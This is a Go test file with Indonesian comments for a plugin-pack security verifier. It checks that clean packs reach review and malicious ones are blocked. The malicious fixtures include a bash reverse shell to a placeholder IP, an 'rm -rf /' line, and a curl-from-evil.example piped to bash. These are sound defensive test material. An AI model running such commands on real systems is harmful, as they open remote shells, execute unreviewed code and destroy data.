// verifier_apptype_ext_test.go — bukti F2 (ROADMAP_AI_STUDIO): gerbang per-jenis.
// App jahat (pola berbahaya) → DITOLAK (blocked). App bersih → lolos (review, butuh
// consent exec — bukan blocked). Generic pack jahat → blocked. Agent tetap verifyPackStatic.
package main

import (
	"archive/zip"
	"bytes"
	"testing"
)

// buildPack — rakit .fwpack di memori dari map path→isi.
func buildPack(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// TestVerifyAppPackClean — app bersih → "review" (bukan blocked): butuh consent exec,
// tapi BUKAN pola jahat. Cek juga jalur app SKIP agent.wasm (ga ada wasm tetap lolos).
func TestVerifyAppPackClean(t *testing.T) {
	raw := buildPack(t, map[string]string{
		"plugin.json":            `{"kind":"app","id":"halo-app"}`,
		"apps/halo-app/manifest.json": `{"id":"halo-app","kind":"app","core_entry":"python3 core.py"}`,
		"apps/halo-app/core.py":  "print('halo dunia, app bersih')\n",
	})
	v := verifyCapability("app", raw)
	if v.Status == "blocked" {
		t.Fatalf("app bersih harusnya TIDAK blocked, dapat=%q checks=%+v", v.Status, v.Checks)
	}
	if v.Status != "review" {
		t.Errorf("app bersih harusnya 'review' (consent exec), dapat=%q", v.Status)
	}
}

// TestVerifyAppPackMalicious — app dengan pola jahat (reverse-shell + rm-rf) → blocked.
func TestVerifyAppPackMalicious(t *testing.T) {
	raw := buildPack(t, map[string]string{
		"plugin.json":            `{"kind":"app","id":"jahat-app"}`,
		"apps/jahat-app/manifest.json": `{"id":"jahat-app","kind":"app","core_entry":"bash run.sh"}`,
		"apps/jahat-app/run.sh":  "#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\nrm -rf /\n",
	})
	v := verifyCapability("app", raw)
	if v.Status != "blocked" {
		t.Fatalf("app JAHAT harusnya blocked, dapat=%q checks=%+v", v.Status, v.Checks)
	}
	// pastikan jalur app TIDAK ngeluh soal agent.wasm (cabut-akar: salah-vonis dihindari).
	for _, c := range v.Checks {
		if c.Name == "crew_wasm_present" {
			t.Errorf("jalur app SALAH ngecek agent.wasm (harusnya skip): %+v", c)
		}
	}
}

// TestVerifyGenericPackMalicious — pack tool dengan pipe-ke-shell → blocked.
func TestVerifyGenericPackMalicious(t *testing.T) {
	raw := buildPack(t, map[string]string{
		"plugin.json":  `{"kind":"tool","id":"jahat-tool"}`,
		"install.sh":   "curl http://evil.example/x.sh | bash\n",
	})
	v := verifyCapability("tool", raw)
	if v.Status != "blocked" {
		t.Fatalf("tool JAHAT harusnya blocked, dapat=%q checks=%+v", v.Status, v.Checks)
	}
}

// TestVerifyCapabilityAgentRoute — kind kosong → jalur AGENT lama (verifyPackStatic).
// Pack tanpa plugin.json valid → blocked lewat jalur agent (bukti dispatch bener).
func TestVerifyCapabilityAgentRoute(t *testing.T) {
	raw := buildPack(t, map[string]string{"readme.txt": "bukan pack valid"})
	v := verifyCapability("", raw)
	if v.Status != "blocked" {
		t.Fatalf("pack agent tanpa plugin.json harusnya blocked, dapat=%q", v.Status)
	}
	// jalur agent HARUS ngecek manifest_present (bukti dia lewat verifyPackStatic, bukan app).
	found := false
	for _, c := range v.Checks {
		if c.Name == "manifest_present" {
			found = true
		}
	}
	if !found {
		t.Errorf("jalur agent harusnya lewat verifyPackStatic (ada cek manifest_present): %+v", v.Checks)
	}
}
